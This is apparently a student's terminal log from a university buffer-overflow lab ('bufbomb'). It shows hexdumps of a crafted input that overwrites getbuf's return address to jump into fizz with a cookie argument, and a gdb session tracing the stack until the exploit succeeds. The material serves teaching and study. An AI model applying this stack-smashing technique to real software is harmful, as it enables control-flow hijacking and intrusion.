@@ -1,0 +1,678 @@
+(none): /home/auser auser$: cd course-materials/lab3
+(none): /home/auser/course-materials/lab3 auser$: ls
+bufbomb    fizz.txt	     log_smoke.txt  sendstring	 smoke.txt~  USERID~
+bufbomb.c  fizz.txt~	     makecookie     smoke.bytes  tmpcmd.txt
+bufbomb.d  instructions.pdf  Makefile	    smoke.txt	 USERID
+(none): /home/auser/course-materials/lab3 auser$: ./sendstring fizz.txt > fizz.bytes
+
+(none): /home/auser/course-materials/lab3 auser$: hexdump fizz.bytes
+0000000 000a                                   
+0000001
+(none): /home/auser/course-materials/lab3 auser$: hexdump -c fizz.bytes
+0000000  \n                                                            
+0000001
+(none): /home/auser/course-materials/lab3 auser$: hexdump -C fizz.bytes
+00000000  0a                                                |.|
+00000001
+(none): /home/auser/course-materials/lab3 auser$: hexdump -C fizz.txt
+00000000  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+00000010  30 20 30 30 20 30 30 20  30 30 20 30 30 20 30 30  |0 00 00 00 00 00|
+00000020  20 30 30 20 30 30 20 30  30 20 30 30 20 30 30 20  | 00 00 00 00 00 |
+00000030  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+00000040  30 20 30 30 20 30 30 20  30 30 20 30 30 20 30 30  |0 00 00 00 00 00|
+00000050  20 30 30 20 30 30 20 30  30 20 30 30 20 30 30 20  | 00 00 00 00 00 |
+00000060  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+00000070  30 20 30 30 20 30 30 20  30 30 20 30 30 20 30 30  |0 00 00 00 00 00|
+00000080  20 30 30 20 30 30 20 30  30 20 30 30 20 30 30 20  | 00 00 00 00 00 |
+00000090  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+000000a0  30 20 30 30 20 30 30 20  37 30 20 31 30 20 34 30  |0 00 00 70 10 40|
+000000b0  20 30 30 0a                                       | 00.|
+000000b4
+(none): /home/auser/course-materials/lab3 auser$: ./sendstring <fizz.txt > fizz.bytes
+(none): /home/auser/course-materials/lab3 auser$: hexdump -C fizz.txt00000000  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+00000010  30 20 30 30 20 30 30 20  30 30 20 30 30 20 30 30  |0 00 00 00 00 00|
+00000020  20 30 30 20 30 30 20 30  30 20 30 30 20 30 30 20  | 00 00 00 00 00 |
+00000030  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+00000040  30 20 30 30 20 30 30 20  30 30 20 30 30 20 30 30  |0 00 00 00 00 00|
+00000050  20 30 30 20 30 30 20 30  30 20 30 30 20 30 30 20  | 00 00 00 00 00 |
+00000060  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+00000070  30 20 30 30 20 30 30 20  30 30 20 30 30 20 30 30  |0 00 00 00 00 00|
+00000080  20 30 30 20 30 30 20 30  30 20 30 30 20 30 30 20  | 00 00 00 00 00 |
+00000090  30 30 20 30 30 20 30 30  20 30 30 20 30 30 20 30  |00 00 00 00 00 0|
+000000a0  30 20 30 30 20 30 30 20  37 30 20 31 30 20 34 30  |0 00 00 70 10 40|
+000000b0  20 30 30 0a                                       | 00.|
+000000b4
+(none): /home/auser/course-materials/lab3 auser$: hexdump -C fizz.bytes
+00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000030  00 00 00 00 00 00 00 00  70 10 40 00 0a           |........p.@..|
+0000003d
+(none): /home/auser/course-materials/lab3 auser$: gdb ./bufbomb
+GNU gdb (GDB) Fedora (7.4.50.20120120-54.fc17)
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-redhat-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /home/auser/course-materials/lab3/bufbomb...done.
+(gdb) break getbuf
+Breakpoint 1 at 0x400da0: file bufbomb.c, line 132.
+(gdb) r -u 3279655 < fizz.bytes
+Starting program: /home/auser/course-materials/lab3/bufbomb -u 3279655 < fizz.bytes
+Username: 3279655
+bb
+1e
+5e
+28
+57
+93
+bb
+61
+Cookie: 0x61bb9357285e1ebb
+
+Breakpoint 1, getbuf () at bufbomb.c:132
+132	{
+(gdb) disas
+Dump of assembler code for function getbuf:
+=> 0x0000000000400da0 <+0>:	push   %rbp
+   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
+   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
+   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
+   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
+   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
+   0x0000000000400dbb <+27>:	mov    %rax,%rcx
+   0x0000000000400dbe <+30>:	mul    %rdx
+   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
+   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
+   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
+   0x0000000000400dcc <+44>:	shl    $0x3,%rax
+   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
+   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
+   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
+   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
+   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
+   0x0000000000400de2 <+66>:	add    $0x1e,%rax
+   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
+   0x0000000000400dea <+74>:	sub    %rax,%rsp
+   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
+   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
+   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
+   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
+   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
+   0x0000000000400e09 <+105>:	add    $0x1,%rcx
+   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
+   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
+   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
+   0x0000000000400e16 <+118>:	mov    %rdx,%rax
+   0x0000000000400e19 <+121>:	leaveq 
+   0x0000000000400e1a <+122>:	retq   
+---Type <return> to continue, or q <return> to quit---
+End of assembler dump.
+(gdb) info r
+rax            0x0	0
+rbx            0x5d163430	1561736240
+rcx            0xdeadbeef	3735928559
+rdx            0x30c81b2ae0	209515653856
+rsi            0xc	12
+rdi            0x0	0
+rbp            0x7fffffffbbb0	0x7fffffffbbb0
+rsp            0x7fffffffbb88	0x7fffffffbb88
+r8             0x401337	4199223
+r9             0x7ffff7ffb000	140737354117120
+r10            0x0	0
+r11            0x30c7e88729	209512335145
+r12            0x607f80	6324096
+r13            0x7fffffffe750	140737488349008
+r14            0x0	0
+r15            0x0	0
+rip            0x400da0	0x400da0 <getbuf>
+eflags         0x206	[ PF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x /32wx $rsp
+0x7fffffffbb88:	0x00400ef3	0x00000000	0xffffbbc0	0x00007fff
+0x7fffffffbb98:	0xdeadbeef	0x00000000	0xc81b0120	0x00000030
+0x7fffffffbba8:	0x5d163430	0x00000000	0xffffe650	0x00007fff
+0x7fffffffbbb8:	0x00400fdd	0x00000000	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbe8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+(gdb) n
+136	  unsigned long long val = (unsigned long long)Gets(buf);
+(gdb) 
+137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
+(gdb) 
+136	  unsigned long long val = (unsigned long long)Gets(buf);
+(gdb) 
+137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) print $i
+$1 = void
+(gdb) print i
+$2 = <optimized out>
+(gdb) print (int)i
+$3 = <optimized out>
+(gdb) n
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) info locals
+buf = '\000' <repeats 35 times>
+variable_length = 0x7fffffffbb10 ""
+val = <optimized out>
+(gdb) n
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) disas
+Dump of assembler code for function getbuf:
+   0x0000000000400da0 <+0>:	push   %rbp
+   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
+   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
+   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
+   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
+   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
+   0x0000000000400dbb <+27>:	mov    %rax,%rcx
+   0x0000000000400dbe <+30>:	mul    %rdx
+   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
+   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
+   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
+   0x0000000000400dcc <+44>:	shl    $0x3,%rax
+   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
+   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
+   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
+   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
+   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
+   0x0000000000400de2 <+66>:	add    $0x1e,%rax
+   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
+   0x0000000000400dea <+74>:	sub    %rax,%rsp
+   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
+   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
+   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
+   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
+=> 0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
+   0x0000000000400e09 <+105>:	add    $0x1,%rcx
+   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
+   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
+   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
+   0x0000000000400e16 <+118>:	mov    %rdx,%rax
+   0x0000000000400e19 <+121>:	leaveq 
+   0x0000000000400e1a <+122>:	retq   
+---Type <return> to continue, or q <return> to quit---
+End of assembler dump.
+(gdb) x /32wx $rsp
+0x7fffffffbb10:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffbb20:	0x5d163430	0x00000000	0xffffbb80	0x00007fff
+0x7fffffffbb30:	0x00607f80	0x00000000	0xffffe750	0x00007fff
+0x7fffffffbb40:	0x00000000	0x00000000	0x00400db1	0x00000000
+0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffbb70:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffbb80:	0x00000000	0x00000000	0x00401070	0x00000000
+(gdb) n
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+131	unsigned long long getbuf()
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+140		variable_length[i] = buf[i];
+(gdb) 
+138	  for(i = 0; i < 36; i++)
+(gdb) 
+143	}
+(gdb) 
+fizz (arg1=0, arg2=51 '3', arg3=24, arg4=0x24 <Address 0x24 out of bounds>, 
+    arg5=-17648, arg6=0, val=3735928559) at bufbomb.c:73
+73	{
+(gdb) 
+74	  entry_check(1);  /* Make sure entered this function properly */
+(gdb) disas
+Dump of assembler code for function fizz:
+   0x0000000000401070 <+0>:	sub    $0x8,%rsp
+=> 0x0000000000401074 <+4>:	movl   $0x1,0x201232(%rip)        # 0x6022b0 <check_level>
+   0x000000000040107e <+14>:	mov    0x10(%rsp),%rsi
+   0x0000000000401083 <+19>:	cmp    0x201296(%rip),%rsi        # 0x602320 <cookie>
+   0x000000000040108a <+26>:	je     0x40109f <fizz+47>
+   0x000000000040108c <+28>:	mov    $0x4015b0,%edi
+   0x0000000000401091 <+33>:	xor    %eax,%eax
+   0x0000000000401093 <+35>:	callq  0x4007f0 <printf@plt>
+   0x0000000000401098 <+40>:	xor    %edi,%edi
+   0x000000000040109a <+42>:	callq  0x4008c0 <exit@plt>
+   0x000000000040109f <+47>:	mov    $0x401590,%edi
+   0x00000000004010a4 <+52>:	xor    %eax,%eax
+   0x00000000004010a6 <+54>:	callq  0x4007f0 <printf@plt>
+   0x00000000004010ab <+59>:	mov    $0x1,%edi
+   0x00000000004010b0 <+64>:	callq  0x400e30 <validate>
+   0x00000000004010b5 <+69>:	jmp    0x401098 <fizz+40>
+End of assembler dump.
+(gdb) x /40wx $rsp
+0x7fffffffbb88:	0x00401070	0x00000000	0xffffbbc0	0x00007fff
+0x7fffffffbb98:	0xdeadbeef	0x00000000	0xc81b0120	0x00000030
+0x7fffffffbba8:	0x5d163430	0x00000000	0xffffe650	0x00007fff
+0x7fffffffbbb8:	0x00400fdd	0x00000000	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbe8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbbf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbc08:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+0x7fffffffbc18:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
+(gdb) info r
+rax            0x18	24
+rbx            0x5d163430	1561736240
+rcx            0x24	36
+rdx            0x18	24
+rsi            0x7fffffffbb33	140737488337715
+rdi            0x0	0
+rbp            0x0	0x0
+rsp            0x7fffffffbb88	0x7fffffffbb88
+r8             0x7fffffffbb10	140737488337680
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x607f80	6324096
+r13            0x7fffffffe750	140737488349008
+r14            0x0	0
+r15            0x0	0
+rip            0x401074	0x401074 <fizz+4>
+eflags         0x216	[ PF AF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x /w $rsp+0x10
+0x7fffffffbb98:	0xdeadbeef
+(gdb) x /2w $rsp+0x10
+0x7fffffffbb98:	0xdeadbeef	0x00000000
+(gdb) k
+Kill the program being debugged? (y or n) y
+(gdb) q
+(none): /home/auser/course-materials/lab3 auser$: ./sendstring <fizz.txt > fizz.bytes
+(none): /home/auser/course-materials/lab3 auser$: hexdump -C fizz.bytes00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000030  00 00 00 00 00 00 00 00  70 10 40 00 00 00 00 00  |........p.@.....|
+00000040  00 00 00 00 00 00 00 00  61 bb 93 57 28 5e 1e bb  |........a..W(^..|
+00000050  0a                                                |.|
+00000051
+(none): /home/auser/course-materials/lab3 auser$: buffbomb -u 3279655 < fizz.bytes
+bash: buffbomb: command not found
+(none): /home/auser/course-materials/lab3 auser$: ./buffbomb -u 3279655 < fizz.bytes
+bash: ./buffbomb: No such file or directory
+(none): /home/auser/course-materials/lab3 auser$: ./bufbomb -u 3279655 < fizz.bytes
+Username: 3279655
+bb
+1e
+5e
+28
+57
+93
+bb
+61
+Cookie: 0x61bb9357285e1ebb
+Type string: Misfire: You called fizz(0xbb1e5e285793bb61)
+(none): /home/auser/course-materials/lab3 auser$: ./sendstring <fizz.txt > fizz.bytes
+(none): /home/auser/course-materials/lab3 auser$: ./bufbomb -u 3279655 < fizz.bytes
+Username: 3279655
+bb
+1e
+5e
+28
+57
+93
+bb
+61
+Cookie: 0x61bb9357285e1ebb
+Type string: Fizz!: You called fizz(0x61bb9357285e1ebb)
+(none): /home/auser/course-materials/lab3 auser$: 
+
